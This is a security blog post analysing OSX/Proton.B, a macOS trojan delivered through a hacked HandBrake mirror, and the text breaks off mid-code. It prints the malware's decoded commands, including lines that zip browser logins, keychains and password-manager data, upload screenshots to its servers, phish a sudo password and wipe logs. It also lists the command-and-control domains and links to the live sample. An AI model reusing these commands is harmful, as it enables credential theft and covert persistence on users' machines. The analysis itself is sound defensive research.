<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">

<head>
<title>Objective-See</title>

<meta property="og:title" content="OSX/Proton.B: A brief analysis, at 6 miles up" />
<meta property="og:type" content="website" />
<meta property="og:image" content="https://objective-see.com/images/blog/blog_0x1D/blockblock.png" />

<link rel="shortcut icon" href="../images/logoApple.ico">
<link rel="stylesheet" type="text/css" href="../css/style.css">
<link href="../css/ss-social.css" rel="stylesheet" />
<link href="../css/ss-standard.css" rel="stylesheet" />
<link href="../css/timeline.css" rel="stylesheet" />
<link href="../css/table.css" rel="stylesheet" />


<link href="https://objective-see.com/rss.xml" rel="alternate" type="application/rss+xml" title="Objective-See's Blog Feed" />

<script src="../js/analytics.js"></script>

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

</head>

<body>
<nav role="main">
<ul>
	<li><a href="../index.html" class="menubutton logo">Objective See</a></li>
	<li><a href="../about.html" class="menubutton about">about</a></li>
	<li><a href="../blog.html" class="menubutton blog visited">blog</a></li>
	<li><a href="../malware.html" class="menubutton malware">malware</a></li>
	<li><a href="../products.html" class="menubutton products">products</a></li>
</ul>
</nav>

<div class="pageContent">
	<hr class="gradient">
	<br>
	<section class="blogContent">
		<div class="blogTitle">OSX/Proton.B</div>
		<div class="blogSubTitle">&rsaquo; a brief analysis, at 6 miles up</div>
		<div class="blogDate">5/10/2017</div>
		
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
		<span class="n3rdFont">
		love these blog posts? support my tools &amp; writing on <a class="inlineLink" href="https://www.patreon.com/objective_see"><span class="n3rdFont">patreon</span></a>! Mahalo :) 
		<br><br>
		<span>
		<a class="inlineLink" href="https://www.patreon.com/objective_see">
			<img src="../images/blog/blog_0x1D/patreon.png" width="700" style="display:block; margin:auto;"/>
		</a>
		</span>
		<br>
		</span>
		</div>
		<br>
		<div style="border: 1px solid red; padding: 10px; margin-top:15px;">
		Want to play along? I've shared both the trojaned Handbrake disk image and OSX/Proton.B payload, which can be downloaded <a class="inlineLink" href="https://objective-see.com/downloads/malware/Proton.zip">here</a> (password: <span class="n3rdFont">infect3d</span>). 
		<br>
		<br>
		Please don't infect yourself!
		</div>
		<br>
		<span style="color: #95c02d; font-weight: bold;">Background</span><br>
		As I'm sure you are now aware, a mirror server of the popular open-source video transcoder, <a class="inlineLink" href="https://handbrake.fr">HandBrake</a>, was hacked. One goal of the hack was to infect macOS users by trojaning the legitimate HandBreak application with a new variant of <span class="n3rdFont">OSX/Proton</span>.
		<br><br>
		<span><img src="../images/blog/blog_0x1F/alert.png" width="400" style="display:block; margin:auto;"/></span>
		<br>
		I recently blogged about how the app was trojaned and how the malware persistently installed itself: <a class="inlineLink" href="https://objective-see.com/blog/blog_0x1D.html">"HandBrake Hacked! OSX/Proton (re)Appears."</a> However, due to timing constraints (and the fact that it was the weekend) I didn't really dive into the technical details of the malware that much. 
		<br>
		<br>
		Now though, I'm 'stuck' on a flight to Europe (en route to present at 'PostiveHack Days' in Moscow) - so have a massive amount of free time. Moreover I received a bunch of email from the HandBrake developers, infected users, and friends requesting more details on the malware. 
		<br><br>
		Most interestingly several users pinged me, stating that while they ran the infected Handbrake application, they didn't seem to be persistently infected ... intriguing!
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 13px;">
		<span class="n3rdFont">
		"Hi Patrick,<br>
		I had downloaded [and ran] what turned out to be the infected DMG from the Handbrake site last week. 
		<br>
		<br>
		Two quick questions:
		I ran the steps and commands to remove the file, and had these results:
		<ul style="list-style-type: square;">
		<li><span class="n3rdFont">'activity_agent'</span> was not running in my Activity monitor</li><br>
		<li>I ran the Terminal commands from the HB team, which [failed] implying the launch agent plist file didn't exist"</li>
		</ul>
		</span>
		</div>
		<br>
		Want to join me (virtually) at 11294 meters in the sky, as we dive into OSX/Proton.B?
		<br>	
		<br>
		<span style="color: #95c02d; font-weight: bold;">Analysis</span><br>
		Let's first start with the infected <span class="n3rdFont">HandBrake.app</span> that was distributed via a hacked mirror server of the legitimate Handbrake website (<span class="n3rdFont">handbrake.fr</span>):
		<br><br>
		<span><img src="../images/blog/blog_0x1F/diskImage.png" width="800" style="display:block; margin:auto;"/></span>
		<br>
		As mentioned in the previous blog <a class="inlineLink" href="https://objective-see.com/blog/blog_0x1D.html">post</a>, when run by the user the infected Handbrake application kicks off the install of <span class="n3rdFont">OSX/Proton.B</span>. Specifically it:
		<ol>
		<li>unzips <span class="n3rdFont">Contents/Resources/HBPlayerHUDMainController.nib</span> to <span class="n3rdFont">/tmp/HandBrake.app</span>. This 'nib' is a password protected zip file who's password is: <span class="n3rdFont">qzyuzacCELFEYiJ52mhjEC7HYl4eUPAR1EEf63oQ5iTkuNIhzRk2JUKF4IXTRdiQ</span></li><br>
		<li>launches (opens) <span class="n3rdFont">/tmp/HandBrake.app</span></li>
		</ol>
		How specifically does the malware do this?
		<br>
		<br>
		When an application is launched, its <span class="n3rdFont">start()</span> and then <span class="n3rdFont">main()</span> functions are executed. In applications, the <span class="n3rdFont">main()</span> function usually just calls the <span class="n3rdFont">NSApplicationMain</span> method:
		<br><br>
		<span><img src="../images/blog/blog_0x1F/main.png" width="800" style="display:block; margin:auto;"/></span>
		<br>
		<span class="n3rdFont">NSApplicationMain</span> performs a variety of tasks including loading and initializing the application's principal class. In order determine this class, it reads the application's <span class="n3rdFont">Info.plist</span> file. More specifically it reads the value of the <span class="n3rdFont">'NSPrincipalClass'</span> key. If we dump the <span class="n3rdFont">Info.plist</span> file of the trojaned HandBrake application, it's easy to see its principal class is <span class="n3rdFont">'HBApplication'</span>:
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		$ less HandBrake.app/Contents/Info.plist | grep -A 1 Class<br>
		&lt;key&gt;NSPrincipalClass&lt;/key&gt;<br>
		&lt;string&gt;HBApplication&lt;/string&gt;<br>
		</span>
		</div>
		<br>
		For more info on the macOS application startup process, see the wonderful (albeit slightly dated) article: <a class="inlineLink" href="https://www.cocoawithlove.com/2009/01/demystifying-nsapplication-by.html">"Demystifying NSApplication by recreating it."</a>
		<br>
		<br>
		So typically, Objective-C objects are created via a call to <span class="n3rdFont">alloc</span> and then <span class="n3rdFont">init</span>:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
        <span style="color: #006600;">//instantiate object</span><br>
        id someObj = [SomeObj alloc] init];<br>
        </span>
        </div>
        <br>
        If we peak at <span class="n3rdFont">HBApplication</span>'s init method some new (malicious) code has been added:
        <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
        <span style="color: #006600;">//-[HBApplication init]</span><br>
        <br>
        <span style="color: #006600;">//decode string</span><br>
       	r14 = [<b>_DWOI</b>(&amp;var_A0, 0x2d) retain];<br>
       	<br>
       	<span style="color: #006600;">//execute decoded string</span><br>
		rbx = [[r13 <b>comrad:</b>r14] retain];<br>
		</span>
        </div>
        <br>
        The <span class="n3rdFont">DWOI</span> function decodes a passed in string:
        <br><br>
		<span><img src="../images/blog/blog_0x1F/dwoi.png" width="400" style="display:block; margin:auto;"/></span>
		<br>
		While the <span class="n3rdFont">[HBApplication comrad:]</span> executes a task via <span class="n3rdFont">"/bin/sh -c"</span>:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
        int -[HBAppDelegate comrad:]() {<br>
   		<br>
	    &nbsp;rax = [NSPipe pipe];<br>
	  	<br>
	    &nbsp;var_38 = [[rax fileHandleForReading] retain];<br>
	    &nbsp;r14 = [[NSTask alloc] init];<br>
	    &nbsp;[r14 setStandardOutput:rax];<br>
	    &nbsp;[r14 setStandardError:rax];<br>
	    &nbsp;[r14 setLaunchPath:@"<b>/bin/sh</b>"];<br>
	   	<br>
	    &nbsp;r12 = [NSArray arrayWithObjects:@"-c", rbx, 0x0];<br>
	    &nbsp;[r14 setArguments:rbx];<br>
	   	<br>
	    &nbsp;[r14 launch];<br>
	    &nbsp;[r14 waitUntilExit];<br>
	    <br>
	    &nbsp;rbx = [[var_38 readDataToEndOfFile] retain];<br>
	    &nbsp;rax = [[NSString alloc] initWithData:rbx encoding:0x4];<br>
	  	<br>
	    &nbsp;return rax;<br>
		}<br>
        </span>
        </div>
        <br>
        If we break on this code in a debugger, we can dump the string that is decoded and executed:
        <div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		b -[HBAppDelegate comrad:]<br>
		Breakpoint 1: where = HandBrake'-[HBAppDelegate comrad:], address = 0x0000000100029625<br>
		<br>
		(lldb) po $rdi<br>
		&lt;HBAppDelegate: 0x102513e30&gt;<br>
		<br>
		(lldb) x/s $rsi<br>
		0x100042aaf: "comrad:"<br>
		<br>
		(lldb) po $rdx
		pgrep -x activity_agent &amp;&amp; echo Queue.hbqueue
		</span>
		</div>
		<br>
		The <span class="n3rdFont">pgrep -x activity_agent &amp;&amp; echo Queue.hbqueue</span> command will echo <span class="n3rdFont">'Queue.hbqueue'</span> if and only if <span class="n3rdFont">'activity_agent'</span> is found in the process list. In other words, this is how the malware installer checks if the persistent component (<span class="n3rdFont">OSX/Proton.B</span>) has already been installed and executed!
		<br>
		<br>
		Assuming <span class="n3rdFont">OSX/Proton.B</span> is not found. executing the trojaned HandBrake application then decodes and executes the following command:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		unzip -P qzyuzacCELFEYiJ52mhjEC7HYl4eUPAR1EEf63oQ5iTkuNIhzRk2JUKF4IXTRdiQ /Users/user/Desktop/HandBrake.app/Contents/Resources/HBPlayerHUDMainController.nib -d /tmp; xattr -c /tmp/HandBrake.app; open /tmp/HandBrake.app;
		</span>
		</div>
		<br>
		As previously mentioned, this will decrypt <span class="n3rdFont">OSX/Proton.B</span> from <span class="n3rdFont">HBPlayerHUDMainController.nib</span> and execute it!
		<br>
		<br>
		Once this malicious logic has been executed, the trojaned HandBrake application continues execution of the normal video transcoding logic so that the user is none the wiser.
		<br>
		<br>
		To analyze <span class="n3rdFont">OSX/Proton.B</span>, we can grab the dropped binary (from <span class="n3rdFont">/tmp/HandBrake.app/Contents/MacOS/HandBrake</span> and load it into a disassembler, as well as instruct the debugger to automatically attach to it when <span class="n3rdFont">OSX/Proton.B</span> is launched (via the debugger's <span class="n3rdFont">'--waitfor'</span> command line argument):
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		(lldb)  process attach --name HandBrake --waitfor<br>
		Process 486 stopped<br>
		* thread #1, stop reason = signal SIGSTOP<br>
    	frame #0: libsystem_c.dylib`__atexit_init<br>
		<br>
		<br>
  		-&gt;  0x7fffad3ffe27 &lt;+0&gt;:  movq   0x8e5d22a(%rip), %rdi<br>     
    	&nbsp;0x7fffad3ffe2e &lt;+7&gt;:  cmpq   $-0x1, 0x20(%rdi)<br>
    	&nbsp;0x7fffad3ffe33 &lt;+12&gt;: jne    0x7fffad3ffe41<br>            
    	&nbsp;0x7fffad3ffe35 &lt;+14&gt;: movq   0x28(%rdi), %rax<br>
    	<br>
    	Executable module set to "/tmp/HandBrake.app/Contents/MacOS/HandBrake".<br>
		Architecture set to: x86_64h-apple-macosx.<br>
		</span>
		</div>
		<br>
		The first thing to notice is that <span class="n3rdFont">OSX/Proton.B</span> contains some (basic) anti-debugging logic:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		rbx = dlopen(0x0, 0xa);<br>
    	(dlsym(rbx, <b>"ptrace"</b>))(0x1f, 0x0, 0x0, 0x0);<br>
    	dlclose(rbx);<br>
		</span>
		</div>
		<br>
		This anti-debugging logic is well-known, as it's even documented in Apple's man page for <span class="n3rdFont">ptrace</span>:
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 13px;">
		<span class="n3rdFont">
		man ptrace<br>
		<br>
		PTRACE(2)<br>
		NAME<br>
     	ptrace -- process tracing and debugging<br>
     	<br>
     	...
     	<br>
     	<br>
		<br>PT_DENY_ATTACH<br>
                   &nbsp;This request is the other operation used by the traced process; it allows a process that<br>
                   &nbsp;is not currently being traced to deny future traces by its parent.  All other arguments<br>
                   &nbsp;are ignored.  If the process is currently being traced, it will exit with the exit status<br>
                   &nbsp;of ENOTSUP; otherwise, it sets a flag that denies future traces.  An attempt by the parent<br>
                   &nbsp;to trace a process which has set this flag will result in a segmentation violation in<br>
                   &nbsp;the parent.<br>
        <br>
		</span>
		</div>
		<br>
		In short, <span class="n3rdFont">PT_DENY_ATTACH</span> (<span class="n3rdFont">0x1F</span>), once executed prevents a user-mode debugger from attaching to the process. However, since <span class="n3rdFont">lldb</span> is already attached to the process (thanks to the <span class="n3rdFont">--waitfor</span> argument),we can neatly sidestep this. How? Set a breakpoint on <span class="n3rdFont">pthread</span> then simply execute a <span class="n3rdFont">'thread return'</span> command. This tells the debugging to stop executing the code within the function and execute a return command to 'exit' to the caller. Neat!
		<br>
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1<br>
    	frame #0: 0x00007fffad499d80 libsystem_kernel.dylib`__ptrace<br>
		<br>
		<br>
		(lldb) thread return<br>
		</span>
		</div>
		<br>
		With the anti-debugging logic out of the way, we can debug to our heart's content!
		<br>
		<br>
		The first thing <span class="n3rdFont">OSX/Proton.B</span> does (well after calling <span class="n3rdFont">ptrace(..., 'PT_DENY_ATTACH')</span>), is decode a bunch of strings that turn out to be the addresses of its command and control servers:
		<ul style="list-style-type: square;">
		<span class="n3rdFont">
		<li>handbrake.cc</li><br>
		<li>handbrake.biz</li><br>
		<li>ls.handbrake.biz</li><br>
		<li>handbrake.biz:8443</li>
		</span>
		</ul>
		Interestingly the string decoding method (at address <span class="n3rdFont">000000010001E6F7</span>) appears to be similar (identical?) to the <span class="n3rdFont">DWOI</span> function in the malware's installer (the trojaned <span class="n3rdFont">HandBrake.app</span>). This indicates that the hackers may have had access to the <span class="n3rdFont">OSX/Proton.B</span> source code. This wouldn't be that interesting, save for the fact that <span class="n3rdFont">OSX/Proton.A</span> was offered for sale (see: <a class="inlineLink" href="https://www.hackread.com/hackers-selling-undetectable-proton-mac-malware/">"Hackers Selling Undetectable Proton Malware for macOS in 40 BTC"</a>). 
		<br>
		<br>
		Does this mean the hacker's purchased <span class="n3rdFont">OSX/Proton.A</span> (including its source code)? Or are the hackers that hit HandBrake the same ones who created <span class="n3rdFont">OSX/Proton</span>? Who knows...
		<br>
		<br>
		Moving on, once the command and control servers have be decoded, the malware decodes a few more strings including: <span class="n3rdFont">'activity_agent'</span> and <span class="n3rdFont">'fr.handbrake.activity_agent'</span> As mentioned in the previous blog, <span class="n3rdFont">OSX/Proton.B</span> persistently installs itself as launch agent (plist: <span class="n3rdFont">fr.handbrake.activity_agent</span>, name <span class="n3rdFont">activity_agent</span>):
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		$ cat <b>fr.handbrake.activity_agent</b>
		<br><br>
		&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>
		&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;<br>
		&lt;plist version=&quot;1.0&quot;&gt;<br>
		&lt;dict&gt;<br>
        &nbsp;&nbsp;&lt;key&gt;KeepAlive&lt;/key&gt;<br>
        &nbsp;&nbsp;&lt;true/&gt;<br>
        &nbsp;&nbsp;...<br>
 	  	&nbsp;&nbsp;&lt;key&gt;ProgramArguments&lt;/key&gt;<br>
        &nbsp;&nbsp;&lt;array&gt;<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;/Users/user/Library/RenderFiles/activity_agent.app/<br>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Contents/MacOS/<b>activity_agent</b>&lt;/string&gt;<br>
        &nbsp;&nbsp;&lt;/array&gt;<br>
        &nbsp;&nbsp;&lt;key&gt;RunAtLoad&lt;/key&gt;<br>
        &nbsp;&nbsp;&lt;true/&gt;<br>
        <br>
		&lt;/dict&gt;<br>
		&lt;/plist&gt;<br>
		</span>
		</div>
		<br>
		Next, <span class="n3rdFont">OSX/Proton.B</span> somewhat 'stealthily' builds a path to an encrypted file named <span class="n3rdFont">'.hash'</span> in its resources directory (<span class="n3rdFont">/tmp/HandBrake.app/Contents/Resources/.hash</span>).
		<br>
		<br>
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		<span style="color: #006600;">//path: /tmp/HandBrake.app/Contents/Resources/<b>.hash</b></span><br>
		rbx = [NSString stringWithFormat:@"%@/%@%@%@%@%@", r13, @".", r9, @"a", @"s", @"h"];
		</span>
		</div>
		<br>
		This file is loaded into memory and then decrypted via a call to <span class="n3rdFont">[RNDecryptor decryptData:withPassword:error:]</span>. The decryption password is <span class="n3rdFont">'9fe4a0c3b63203f096ef65dc98754243979d6bd58fe835482b969aabaaec57e'</span>:
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		Process 486 stopped<br>
		* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over<br>
		HandBrake`___lldb_unnamed_symbol521$$HandBrake:<br>
		<br>
		->  0x100017583 &lt;+259&gt;: callq  *%r15<br>
		    0x100017586 &lt;+262&gt;: movq   %rax, %rdi<br>
		    0x100017589 &lt;+265&gt;: callq  0x100049dae<br>
		    0x10001758e &lt;+270&gt;: movq   %rax, %r13<br>
		    <br>
		(lldb) po $rdi<br>
		<b>RNDecryptor</b><br>
		<br>
		(lldb) x/s $rsi<br>
		0x10004db2b: <b>"decryptData:withPassword:error:"</b><br>
		<br>
		(lldb) po $rcx<br>
		9fe4a0c3b63203f096ef65dc98754243979d6bd58fe835482b969aabaaec57e<br>
		</span>
		</div>
		<br>
		And what is in this encrypted file? A massive list of commands and configuration values. Jackpot!
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 13px;">
		<span class="n3rdFont">
		if [ -f %@/.crd ]; then cat %@/.crd; else echo failure; fi,<br>
		if [ -f %@/.ptrun ]; then echo success; fi,<br>
		touch %@/.ptrun;,<br>
		curl,<br>
		https://%@/kukpxx8lnldxvbma8c4xqtar/auth?B=%@&amp;U=%@&amp;S=%@,<br>
		echo '%@' | sudo -S echo success;,<br>
		rm -rf %@/%@.app %@;,<br>
		rm -rf ~/Library/LaunchAgents/%@*; ,<br>
		curl %@ -o %@ &amp;&amp; sudo chmod 777 %@;,<br>
		HandBrake needs to install additional codecs. Enter your password to allow this.,<br>
		screencapture -x %@/scr%@.png,<br>
		https://%@/api/upload,<br>
		%@/scr%@.png,<br>
		yyyy-MM-dd HH:mm:ss zzz,<br>
		ping -c 1 %@ 2&gt;/dev/null &gt;/dev/null &amp;&amp; echo 0,<br>
		%@.app,<br>
		cat %@/.crd,<br>
		if [ -f %@/.bcrd ]; then cat %@/.bcrd; else echo failure; fi,<br>
		echo '%@:%@:%@' &gt; %@/.crd; ,<br>
		echo 'printf &quot;\033[8;1;1t&quot;; echo &quot;%@&quot; | sudo -S sh -c &quot;echo 'Defaults !tty_tickets' &gt;&gt; /etc/sudoers&quot;; killall Terminal; sleep 1;' &gt; ~/Library/sco.command; chmod 777 ~/Library/sco.command; open ~/Library/sco.command &amp;&amp; sleep 2.7; rm -rf ~/Library/sco.command;,<br>
		echo '%@:%@:%@' &gt; %@/.crd,<br>
		AKADOMEDO,<br>
		CFBundleExecutable,<br>
		@%@/proton.zip,<br>
		/bin/sh,<br>
		https://%@,<br>
		-c,<br>
		a%@=`curl -s ,<br>
		api_key=%@&amp;cts=%@%@,<br>
		-F api_key=%@ -F cts=%@ -F signature=%@ https://%@/api/%@`; echo $a%@;,<br>
		echo '%@' | sudo -S rm -rf %@ %@/*.zip,<br>
		cat %@/.crd,<br>
		hcresult=`curl -s --connect-timeout 10 %@` &amp;&amp; echo $hcresult;,<br>
		type,<br>
		name,<br>
		path,<br>
		size,<br>
		creation_date,<br>
		modification_date,<br>
		folders,<br>
		files,<br>
		total_folders,<br>
		total_files,<br>
		folder,<br>
		--,<br>
		rm -rf %@,<br>
		%@/.str.txt,<br>
		-O -J https://%@,<br>
		0aaf7a0da92119ccf0ba,<br>
		%@/.tmpdata,<br>
		expiration_date,<br>
		grace_period,<br>
		os_version,<br>
		checksum,<br>
		%@/.hash,<br>
		codesign -dv %@,<br>
		VOID,<br>
		cd %@; curl,<br>
		hcresult=`curl -sL https://script.google.com/macros/s/AKfycbyd5AcbAnWi2Yn0xhFRbyzS4qMq1VucMVgVvhul5XqS9HkAyJY/exec` &amp;&amp; echo $hcresult;,
		zip %@/CR.zip ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Login\ Data ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Cookies ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Bookmarks ~/Library/Application\ Support/Google/Chrome/Profile\ 1/History ~/Library/Application\ Support/Google/Chrome/Profile\ 1/Web\ Data; zip %@/CR_def.zip ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data ~/Library/Application\ Support/Google/Chrome/Default/Cookies ~/Library/Application\ Support/Google/Chrome/Default/Bookmarks ~/Library/Application\ Support/Google/Chrome/Default/History ~/Library/Application\ Support/Google/Chrome/Default/Web\ Data; ,<br>
		zip -r %@/FF.zip ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/cookies.sqlite   ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/formhistory.sqlite     ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/logins.json     ~/Library/Application\ Support/Firefox/$(sh %@/mozilla.sh)/logins.json; ,<br>
		zip -r %@/SF.zip ~/Library/Cookies ~/Library/Safari/Form\ Values; ,<br>
		zip -r %@/OP.zip ~/Library/Application\ Support/com.operasoftware.Opera/Login\ Data ~/Library/Application\ Support/com.operasoftware.Opera/Cookies   ~/Library/Application\ Support/com.operasoftware.Opera/Web\ Data; ,<br>
		killall Console; killall Wireshark; rm -rf %@; ,<br>
		mkdir -p %@ %@ ~/Library/LaunchAgents/; chmod -R 777 %@ %@; zip -r %@/KC.zip ~/Library/Keychains/ /Library/Keychains/; %@ %@ %@ %@ zip -r %@/GNU_PW.zip ~/.gnupg ~/Library/Application\ Support/1Password\ 4  ~/Library/Application\ Support/1Password\ 3.9; zip -r %@/proton.zip %@; %@ echo success; ,
		cp -R %@ %@/%@; mv %@/%@/Contents/MacOS/%@  %@/%@/Contents/MacOS/%@; mv %@/%@/Contents/Resources/Info_.plist   %@/%@/Contents/Info.plist; mv %@/%@/Contents/Resources/%@.plist  ~/Library/LaunchAgents/%@.plist; echo success; ,<br>
		sed -i -e 's/P_MBN/%@/g' ~/Library/LaunchAgents/%@.plist; sed -i -e 's=P_UPTH=%@/%@/Contents/MacOS/%@=g' ~/Library/LaunchAgents/%@.plist; chmod 644 ~/Library/LaunchAgents/%@.plist; codesign --remove-signature %@/%@; rm -rf %@/%@/Ic*; launchctl load ~/Library/LaunchAgents/%@.plist; %@ ,<br>
		ACTION,<br>
		CONSOLE,<br>
		FM,<br>
		PROC,<br>
		SSH_DID_CONNECT,<br>
		SSH_DID_TERMINATE,<br>
		clsock,<br>
		_STROKES,<br>
		screencam,<br>
		exec_pointer,<br>
		ssh_bind_port,<br>
		procs,<br>
		total_procs,<br>
		SSH_DID_NOT_CONNECT,<br>
		/Library/Extensions/LittleSnitch.kext,<br>
		/Library/Extensions/Radio Silence.kext,<br>
		/Library/Extensions/HandsOff.kext,<br>
		%@/.tmpdata,<br>
		%@/updated.license,<br>
		license_enforce,<br>
		mv %@ %@,<br>
		handbrakestore.com,<br>
		handbrake.cc,<br>
		luwenxdsnhgfxckcjgxvtugj.com,<br>
		6gmvshjdfpfbeqktpsde5xav.com,<br>
		kjfnbfhu7ndudgzhxpwnnqkc.com,<br>
		yaxw8dsbttpwrwlq3h6uc9eq.com,<br>
		qrtfvfysk4bdcwwwe9pxmqe9.com,<br>
		fyamakgtrrjt9vrwhmc76v38.com,<br>
		kcdjzquvhsua6hlfbmjzkzsb.com,<br>
		ypu4vwlenkpt29f95etrqllq.com,<br>
		nc -G 20 -z 8.8.8.8 53  &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo success,<br>
		echo '%@' &gt; /tmp/public.pem; openssl rsautl -verify -in %@/.tmpdata -pubin -inkey /tmp/public.pem,<br>
		a90=`curl -s --connect-timeout 10 -o /tmp/au https://%@/rsa` &amp;&amp; echo  &amp;&amp; echo '%@' &gt; /tmp/au.pub &amp;&amp; echo success,<br>
		openssl rsautl -verify -in /tmp/au -pubin -inkey /tmp/au.pub,<br>
		rm -rf /tmp/*,<br>
		sudo -k; echo '%@' | sudo -S rm -rf /var/log/* /Library/Logs/* &amp;&amp; echo success;,<br>
		mv %@/.crd %@/.bcrd,<br>
		sudo -k<br>
		</span>
		</div>
		<br>
		Well this makes analysis rather easy ;) We're not going to walk thru all of these, but let's cover a few of the more interesting items in this this list. 
		<br>
		<br>
		The first items from this list that the malware extracts and utilizes are the following paths:
		<ul style="list-style-type: square;">
		<span class="n3rdFont">
		<li>/Library/Extensions/LittleSnitch.kext</li><br>
		<li>/Library/Extensions/Radio Silence.kext</li><br>
		<li>/Library/Extensions/HandsOff.kext</li>
		</span>
		</ul>
		For each of these paths, it checks if they exist on disk, and if so, the malware immediately exits!
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
		<span class="n3rdFont">
		<span style="color: #006600;">//0x51: 'LittleSnitch.kext'</span><br>
		rax = [*0x10006c4a0 objectAtIndexedSubscript:0x51];<br>
		<br>
    	rdx = rax;<br>
    	if ([rbx fileExistsAtPath:rdx] != 0x0) goto fileExists;<br>
    	<br>
		fileExists:<br>
    	&nbsp;rax = <b>exit(0x0);</b><br>
    	&nbsp;return rax;<br>
		<br>
		</span>
		</div>
		<br>
		These of course are macOS security products (firewalls) which would alert the user to the presence of the malware when it attempts to call out to connect to its command and control server(s). Seems like the malware would simply exit, rather than risking detection.
		<br>
		<br>
		Ah! Could this be why various users, who had ran the infected Handbrake application were not infected? Why yes! Turns out all had been running Little Snitch. Lucky for them :)
		<br>
		<br>
		Assuming no firewall products are detected the malware performs what appears to some verification on itself. (As noted by my friend <a class="inlineLink" href="https://twitter.com/0xamit">0xamit</a>, this is 'license' check). Specifically, the malware executes <span class="n3rdFont">"/bin/sh"</span> with the follwing arguments (in <span class="n3rdFont">$RDX</span>):
		<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
		<span class="n3rdFont">
		(lldb) po $rdx<br>
		<__NSArrayI 0x608000020560>(<br>
		-c,<br>
		echo '-----BEGIN PUBLIC KEY-----<br>
		MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwUP19DdW2NlkkdovqqwF<br>
		+r3sBaamka42zVMGa+COUCIysrVhVJIv4nmc57TLxgG8dsg+G0o0NQ75n898b04l<br>
		YGve3gXGWJ8Y5OTJ16+RA4OtKAiO8v7qEGnQ/QpSzrLZPU3Yd60bAltYSvCCiOdB<br>
		OKhOAiag0H39F2k5ea4zxt6TNDksW/o3+HcjzA4yy+C1tp2Cr4X37O5XMVZPWpMk<br>
		sIXPazh91tr0TJ2VFyx4btnDPajeOzhcKUA05Wrw+hagAZnFU9Bajx3KvdTlxsVx<br>
		LmRc5r3IqDAsXTHH1jpmWMDiC9IGLDFPrN6NffAwjgSmsKhi1SC8yFHh0oPCswRh<br>
		rQIDAQAB<br>
		-----END PUBLIC KEY-----' > /tmp/public.pem; openssl rsautl -verify -in /tmp/HandBrake.app/Contents/Resources/.tmpdata -pubin -inkey /tmp/<br>public.pem<br>
		)<br>
		<br>
		(lldb) po $rax<br>
		{<br>
		    &nbsp;&nbsp;"bundle_name" = chameleo;<br>
		    &nbsp;&nbsp;"checksum" = 128814f2b057aef1dd3e00f3749aed2a81e5ed03737311f2b1faab4ab2e6e2fe;<br>
		    &nbsp;&nbsp;"expiration_date" = "2017-05-10 23:59:59 +0000";<br>
		    &nbsp;&nbsp;"grace_period" = 25;<br>
		    &nbsp;&nbsp;"os_version" = "10.x";<br>
		}<br>
		</span>
		</div>
		<br>
		It compares this <span class="n3rdFont">'checksum'</span> value (<span class="n3rdFont">128814f2b057aef1dd3e00f3749aed2a81e5ed03737311f2b1faab4ab2e6e2fe</span>) with a value that it extracts from the encrypted <span class="n3rdFont">.hash</span> file. If these match the, malware is 'licensed' and will continues executing via a call to <span class="n3rdFont">NSApplicationMain</span>. Otherwise it bails with a call to <span class="n3rdFont">exit()</span>:
		<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 14px;">
		<span class="n3rdFont">
		r14 = [[*0x10006c4a8 objectAtIndexedSubscript:0x3] retain];<br>
		rbx = [[NSString stringWithCString:&amp;var_80 encoding:0x4] retain];<br>
        r15 = [r14 isNotEqualTo:rbx];<br>
        if (r15 == 0x0) {<br>
